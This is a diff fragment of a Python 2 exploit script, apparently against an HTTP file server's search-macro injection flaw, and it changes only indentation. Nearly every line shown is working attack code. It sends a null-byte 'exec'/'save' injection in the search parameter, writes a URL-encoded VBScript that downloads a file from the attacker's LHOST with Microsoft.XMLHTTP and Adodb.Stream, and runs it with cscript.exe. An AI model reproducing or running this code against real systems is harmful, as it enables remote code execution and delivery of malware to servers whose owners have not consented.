@@ -32,17 +32,17 @@ try:
 	def nc_run():
 		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")
 
-	ip_addr = sys.argv[3] 		# local IP address
-    filename = sys.argv[4] 		# filename to upload to remote system
-    scriptname = sys.argv[5] 	# the script that is created and executed
+	ip_addr = sys.argv[3] 			# local IP address
+    	filename = sys.argv[4] 			# filename to upload to remote system
+    	scriptname = sys.argv[5] 		# the script that is created and executed
 	path = urllib.quote_plus(sys.argv[6])	# absolute path on remote system
 	vbs = path+scriptname+"|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2F"+filename+"%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22"+path+filename+"%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
 	save = "save|" + vbs
-    vbs2 = "cscript.exe%20"+path+scriptname
+   	 vbs2 = "cscript.exe%20"+path+scriptname
 	exe	 = "exec|"+vbs2
 	script_create()
 	execute_script()
 except:
 	print """[.]Something went wrong..!
 	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number> <LHOST> <filename> <scriptname> <path>"""
-    raise
+    	raise
